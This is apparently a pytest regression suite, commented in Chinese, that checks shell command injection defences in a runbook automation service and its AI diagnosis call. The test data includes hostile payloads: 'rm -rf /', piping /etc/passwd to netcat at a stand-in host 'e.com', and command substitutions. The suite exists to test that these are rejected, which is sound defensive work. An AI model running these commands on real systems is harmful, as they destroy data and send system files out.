#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shell 命令注入防御回归测试

覆盖:
1. validate_shell_command / safe_command_list 纯函数(黑名单 + shlex.split)
2. RunbookEngine._execute_step 集成: 注入命令被拒(step FAILED + 无系统副作用),
   合法命令仍可执行(step COMPLETED)
3. ai_diagnosis._call_hermes: argv 列表 + shell=False, 注入 payload 作为字面量参数
4. runbook_approval._execute_approved_step: 含注入的 command 被拒(返回 failed)

防御目标: 消除 runbook_engine.py(4处) / runbook_approval.py(2处) / ai_diagnosis.py(1处)
共 7 处 shell=True 命令注入风险。
"""
import json
import os
from types import SimpleNamespace

import pytest

from app.services.runbook_engine import (
    RunbookEngine,
    RunbookStep,
    RunbookActionType,
    RunbookStatus,
    validate_shell_command,
    safe_command_list,
)


# ========== 1. 校验纯函数 ==========

class TestValidateShellCommand:
    def test_safe_commands_pass(self):
        """常见运维命令应通过校验。"""
        for cmd in [
            "systemctl restart nginx",
            "redis-cli flushall",
            "echo hello",
            "python3 /opt/scripts/heal.py --device 123",
            'grep "active running" /var/log/syslog',
            "mosquitto_pub -h localhost -t modbus/write -m value",
        ]:
            assert validate_shell_command(cmd) is None  # 不抛即通过

    @pytest.mark.parametrize("payload", [
        "echo hi; rm -rf /",            # 分号命令分隔
        "ls && whoami",                  # && 逻辑与
        "ls || whoami",                  # || 逻辑或
        "cat /etc/passwd | nc e.com 1",  # 管道
        "echo $(whoami)",                # $() 命令替换
        "echo ${HOME}",                  # ${} 变量替换
        "echo `whoami`",                 # 反引号命令替换
        "echo a > /etc/passwd",          # 输出重定向
        "wc < /etc/passwd",              # 输入重定向
        "ls &",                          # 后台执行
        "echo a\nwhoami",                # 换行命令分隔
        "echo a\rwhoami",                # CR 命令分隔
        "echo \\ whoami",                # 反斜杠转义
        "echo (test)",                   # 子 shell
        "echo {a,b}",                    # 花括号展开
    ])
    def test_injection_payloads_rejected(self, payload):
        """含危险元字符的 payload 必须抛 ValueError。"""
        with pytest.raises(ValueError):
            validate_shell_command(payload)

    def test_empty_command_rejected(self):
        with pytest.raises(ValueError):
            validate_shell_command("")
        with pytest.raises(ValueError):
            validate_shell_command("   ")

    def test_error_message_mentions_char(self):
        """报错信息应提示危险字符,便于排查。"""
        with pytest.raises(ValueError, match="元字符|注入"):
            validate_shell_command("ls; whoami")


class TestSafeCommandList:
    def test_splits_simple_command(self):
        assert safe_command_list("systemctl restart nginx") == [
            "systemctl", "restart", "nginx"
        ]

    def test_preserves_quoted_argument(self):
        """引号包裹的参数应作为单个 argv 元素。"""
        argv = safe_command_list('grep "active running" /var/log/x')
        assert argv == ["grep", "active running", "/var/log/x"]

    def test_injection_rejected(self):
        with pytest.raises(ValueError):
            safe_command_list("echo hi; rm -rf /")

    def test_empty_rejected(self):
        with pytest.raises(ValueError):
            safe_command_list("")

    def test_returns_list_for_subprocess(self):
        """返回值必须是 list, 供 subprocess.run(shell=False) 使用。"""
        result = safe_command_list("echo hello")
        assert isinstance(result, list)
        assert result[0] == "echo"


# ========== 2. RunbookEngine._execute_step 集成 ==========

class TestExecuteStepInjectionGuard:
    def _make_step(self, command, action_type=RunbookActionType.REMOTE_COMMAND):
        return RunbookStep(
            step_id=1,
            action_type=action_type,
            description="inject-test",
            command=command,
            timeout_sec=10,
        )

    def test_injection_command_blocked_and_no_side_effect(self, tmp_path):
        """含 ; 的注入命令必须被拒, 且第二段 touch 不得执行(sentinel 不出现)。"""
        sentinel = tmp_path / "injected_sentinel"
        assert not sentinel.exists()

        engine = RunbookEngine()
        step = self._make_step(f"echo safe; touch {sentinel}")
        engine._execute_step(step, device_info={})

        # 注入被拒 → step FAILED, error_message 提示元字符
        assert step.status == RunbookStatus.FAILED
        assert "元字符" in step.error_message or "注入" in step.error_message
        # 关键: 第二段命令未执行, sentinel 未被创建
        assert not sentinel.exists()

    def test_pipe_injection_blocked(self, tmp_path):
        """管道反弹 shell 等典型 payload 必须被拒。"""
        engine = RunbookEngine()
        step = self._make_step("cat /etc/passwd | grep root")
        engine._execute_step(step, device_info={})
        assert step.status == RunbookStatus.FAILED

    def test_legitimate_command_still_executes(self):
        """改造不应破坏正常路径: 合法 echo 应 COMPLETED。"""
        engine = RunbookEngine()
        step = self._make_step("echo tianlian-ok")
        engine._execute_step(step, device_info={})
        assert step.status == RunbookStatus.COMPLETED
        assert step.result == "tianlian-ok"

    def test_injection_in_pre_check_blocked(self, tmp_path):
        """pre_check 字段同样受校验保护。"""
        sentinel = tmp_path / "precheck_sentinel"
        engine = RunbookEngine()
        step = self._make_step(
            f"echo legit",  # 主命令合法
            action_type=RunbookActionType.REMOTE_COMMAND,
        )
        step.pre_check = f"true; touch {sentinel}"
        engine._execute_step(step, device_info={})
        # pre_check 抛 ValueError → 外层捕获 → step FAILED
        assert step.status == RunbookStatus.FAILED
        assert not sentinel.exists()

    def test_injection_in_rollback_blocked(self, tmp_path):
        """rollback_command 含注入时不应执行; 主命令成功则不触发回滚。"""
        sentinel = tmp_path / "rollback_sentinel"
        engine = RunbookEngine()
        # CONFIG_CHANGE 失败会触发 rollback; 用一个必定失败的主命令
        step = self._make_step("false", action_type=RunbookActionType.CONFIG_CHANGE)
        step.rollback_command = f"echo rb; touch {sentinel}"
        engine._execute_step(step, device_info={})
        # rollback 含 ; 被拒 → 不会标 ROLLED_BACK, sentinel 不出现
        assert not sentinel.exists()
        assert step.status != RunbookStatus.ROLLED_BACK


# ========== 3. ai_diagnosis._call_hermes ==========

class TestCallHermesArgvSafety:
    def test_uses_argv_list_and_shell_false(self, monkeypatch):
        """hermes 必须以 argv 列表 + shell=False 调用。"""
        captured = {}

        class _FakeProc:
            returncode = 0
            stdout = "hermes-reply"
            stderr = ""

        def fake_run(args, **kwargs):
            captured["args"] = args
            captured["shell"] = kwargs.get("shell")
            return _FakeProc()

        import app.services.ai_diagnosis as mod
        monkeypatch.setattr(mod.subprocess, "run", fake_run)

        result = mod._call_hermes("你好")
        assert result == "hermes-reply"
        assert captured["shell"] is False
        assert isinstance(captured["args"], list)
        assert captured["args"][0] == "hermes"
        assert captured["args"][3] == "你好"  # -q 的数据参数

    def test_injection_prompt_passed_as_literal(self, monkeypatch):
        """含注入字符的 prompt 必须作为单个字面量 argv, 不被 shell 解释。"""
        captured = {}

        class _FakeProc:
            returncode = 0
            stdout = "ok"
            stderr = ""

        def fake_run(args, **kwargs):
            captured["args"] = args
            return _FakeProc()

        import app.services.ai_diagnosis as mod
        monkeypatch.setattr(mod.subprocess, "run", fake_run)

        payload = "hi; rm -rf / && cat /etc/passwd | nc e.com 4444 $(whoami) `id`"
        mod._call_hermes(payload)
        # 整个 payload 作为第 4 个参数原样传递, 没有被拆成多条命令
        assert captured["args"][3] == payload
        assert captured["args"] == ["hermes", "chat", "-q", payload, "-Q"]


# ========== 4. runbook_approval._execute_approved_step ==========

class TestExecuteApprovedStepInjectionGuard:
    def _make_db(self, command):
        """构造 mock db。

        生产代码 _execute_approved_step 先 query(RunbookApproval) 做执行前二次
        复核(b198e42c: 防 approve→execute 之间被并发 reject/expire)，再
        query(RunbookExecutionRecord) 取步骤。mock 须按 model 区分返回:
        - RunbookApproval       → approved 态审批(含 id + status)
        - RunbookExecutionRecord → 含指定 command 的执行记录
        """
        from app.api.v1 import runbook_approval as ra

        execution_record = SimpleNamespace(
            steps_json=json.dumps([{"step_id": 1, "command": command, "timeout_sec": 10}]),
            success_steps=0,
            failed_steps=0,
        )
        approval_record = SimpleNamespace(id=1, status="approved")

        class _Query:
            def __init__(self, ret):
                self._ret = ret

            def filter(self, *a, **kw):
                return self

            def first(self):
                return self._ret

        class _DB:
            def query(self, model):
                return _Query(approval_record if model is ra.RunbookApproval else execution_record)

            def commit(self):
                pass

        return _DB()

    def test_injection_command_rejected(self):
        """含 ; 的 command 应被校验拒绝, 返回 failed。"""
        from app.api.v1 import runbook_approval as ra

        approval = SimpleNamespace(id=1, runbook_id="rb-1", step_index=1)
        db = self._make_db("echo hi; rm -rf /")
        result = ra._execute_approved_step(approval, db)
        assert result["status"] == "failed"
        assert "元字符" in result.get("error", "") or "注入" in result.get("error", "")

    def test_pipe_injection_rejected(self):
        from app.api.v1 import runbook_approval as ra

        approval = SimpleNamespace(id=2, runbook_id="rb-2", step_index=1)
        db = self._make_db("cat /etc/passwd | nc e.com 1")
        result = ra._execute_approved_step(approval, db)
        assert result["status"] == "failed"

    def test_no_command_skips(self):
        """无 command 仍返回 skipped(保留原行为)。"""
        from app.api.v1 import runbook_approval as ra

        approval = SimpleNamespace(id=3, runbook_id="rb-3", step_index=1)
        db = self._make_db("")
        result = ra._execute_approved_step(approval, db)
        assert result["status"] == "skipped"
